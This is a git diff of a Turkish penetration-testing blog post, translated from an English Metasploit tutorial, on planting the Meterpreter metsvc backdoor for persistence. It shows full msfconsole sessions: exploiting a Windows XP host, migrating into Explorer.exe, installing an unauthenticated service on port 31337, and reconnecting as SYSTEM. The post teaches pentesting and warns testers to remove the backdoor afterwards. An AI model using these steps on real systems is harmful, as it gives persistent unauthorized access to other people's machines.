@@ -5,7 +5,7 @@ date: 2017-06-15 09:01:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,28 +13,32 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework timestomp
-- msf meterpreter timestomp
+- Metasploit Framework kalıcılık
+- msf meterpreter metsvc
 
-excerpt: Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek **forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter ```timestomp``` adı verilen bir komut sağlamaktadır.
+excerpt: Meterpreter oturumu açıldıktan sonra sistemde kalıcılık sağlamak için metsvc servisi kullanılabilir. Bu yazımızda, metsvc servisinin kullanımı açıklanmaktadır.
 ---
 
-Meterpreter Backdoor
-After going through all the hard work of exploiting a system, it’s often a good idea to leave yourself an easier way back into the system for later use. This way, if the service you initially exploited is down or patched, you can still gain access to the system. To read about the original implementation of metsvc, go to http://www.phreedom.org/software/metsvc/.
+# Meterpreter metsvc
 
-Using the metsvc backdoor, you can gain a Meterpreter shell at any point.
+Hedef sisteme giriş yaptıktan sonra, kalıcılık sağlamanın bir yolu da ```metsvc``` servisini kullanmaktır. Bu servis sayesinde istediğiniz zaman tekrar Meterpreter oturumu açabilirsiniz. [metsvc](http://www.phreedom.org/software/metsvc/) hakkında detaylı bilgiyi bağlantıyı kullanarak inceleyebilirsiniz.
 
-One word of warning here before we go any further. Metsvc as shown here requires no authentication. This means that anyone that gains access to the port could access your back door! This is not a good thing if you are conducting a penetration test, as this could be a significant risk. In a real world situation, you would either alter the source to require authentication, or filter out remote connections to the port through some other method.
+metsvc hakkında bilmeniz gereken önemli bir noktayı vurgulayalım. **Bu servisi yerleştirdiğiniz bilgisayarın ilgili portunu bulan herkes bu arka kapıyı kullanabilir.** Pentest işlemleri esnasında kullandıktan sonra iptal etmelisiniz yoksa sistemi, art niyetli kişilere açık duruma getirmiş olursunuz. Bu da sistem sahiplerinin hiç hoşuna gitmeyebilir.
 
-First, we exploit the remote system and migrate to the ‘Explorer.exe’ process in case the user notices the exploited service is not responding and decides to kill it.
+Öncelikle sistemde, bulduğunuz bir açıklıkla ilgili modülü kullanarak meterpreter oturumu açalım.
 
+```sh
 msf exploit(3proxy) > exploit
 
 [*] Started reverse handler
 [*] Trying target Windows XP SP2 - English...
 [*] Sending stage (719360 bytes)
 [*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.104:1983)
+```
 
+```ps``` komutuyla ```Explorer.exe``` programının PID numarasını bulalım ve ```migrate``` komutuyla bu PID numaralı programa geçiş yapalım.
+
+```sh
 meterpreter > ps
 
 Process list
@@ -69,8 +73,11 @@ Process list
 meterpreter > migrate 632
 [*] Migrating to 632...
 [*] Migration completed successfully.
-Before installing metsvc, let’s see what options are available to us.
+```
 
+```metsvc``` modülünü kullanmadan önce yardımı görüntüleyelim ve bize hangi olanakları sağladığını görelim.
+
+```sh
 meterpreter > run metsvc -h
 [*]
 OPTIONS:
@@ -80,8 +87,11 @@ OPTIONS:
     -r        Uninstall an existing Meterpreter service (files must be deleted manually)
 
 meterpreter >
-Since we’re already connected via a Meterpreter session, we won’t set it to connect back to us right away. We’ll just install the service for now.
+```
 
+```metsvc```, normalde bize geri bağlantı da sağlayan bir programdır ancak biz zaten Meterpreter oturumu açtığımız için geri bağlantıya şimdilik ihtiyacımız yok. Sadece programı çalıştıralım.
+
+```sh
 meterpreter > run metsvc
 [*] Creating a meterpreter service on port 31337
 [*] Creating a temporary installation directory C:\DOCUME~1\victim\LOCALS~1\Temp\JplTpVnksh...
@@ -94,16 +104,13 @@ meterpreter > run metsvc
 Service metsvc successfully installed.
 
 meterpreter >
-The service is now installed and waiting for a connection.
+```
 
-Interacting with Metsvc
+```metsvc``` başladı ve artık bağlanmak için bekliyor. Şimdi bu servisle nasıl haberleşeceğimizi görelim.
 
-We will now use the multi/handler with a payload of windows/metsvc_bind_tcp to connect to the remote system. This is a special payload, as typically a Meterpreter payload is multistage, where a minimal amount of code is sent as part of the exploit, and then more is uploaded after code execution has been accomplished.
+Hedef sistemde dinleme durumundaki ```metsvc``` ile haberleşmek için ```windows/metsvc_bind_tcp``` payload modülünü kullanacağız. Modülü, aşağıdaki örnekte olduğu gibi aktif hale getirelim ve gerekli PORT ayarlarını yapalım.
 
-Think of a shuttle rocket, and the booster rockets that are used to get the space shuttle into orbit. This is much the same, except instead of extra items being there and then dropping off, Meterpreter starts as small as possible, then adds on. In this case however, the full Meterpreter code has already been uploaded to the remote machine, and there is no need for a staged connection.
-
-We set all of our options for metsvc_bind_tcp with the victim’s IP address and the port we wish to have the service connect to on our machine. We then run the exploit.
-
+```sh
 msf > use exploit/multi/handler
 msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
 PAYLOAD => windows/metsvc_bind_tcp
@@ -136,12 +143,15 @@ Exploit target:
 
 
 msf exploit(handler) > exploit
-Immediately after issuing ‘exploit’, our metsvc backdoor connects back to us.
 
 [*] Starting the payload handler...
 [*] Started bind handler
 [*] Meterpreter session 2 opened (192.168.1.101:60840 -> 192.168.1.104:31337)
+```
 
+Gördüğünüz gibi ```session 2``` otomatik olarak açıldı. Şimdi, ```metsvc``` servisinin hedef bilgisayarda hangi PID numarasıyla çalıştığına bakalım.
+
+```sh
 meterpreter > ps
 
 Process list
@@ -178,4 +188,8 @@ C:\WINDOWS\system32
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter >
-And here we have a typical Meterpreter session! Again, be careful with when and how you use this trick. System owners will not be happy if you make an attackers job easier for them by placing such a useful backdoor on the system for them.
+```
+
+Çıktıdan görülebileceği gibi, ```metsvc``` programı, 564 PID numarasıyla çalışmaktadır. Artık istediğiniz zaman, hedef bilgisayarda dinleme yapan programa, ```windows/metsvc_bind_tcp``` payload modülünü kullanarak bağlanabiliriz.
+
+Tekrar hatırlatmak gerekirse, güvenlik testi işlemleriniz bittiğinde ```metsvc``` programını sistemden silmelisiniz.
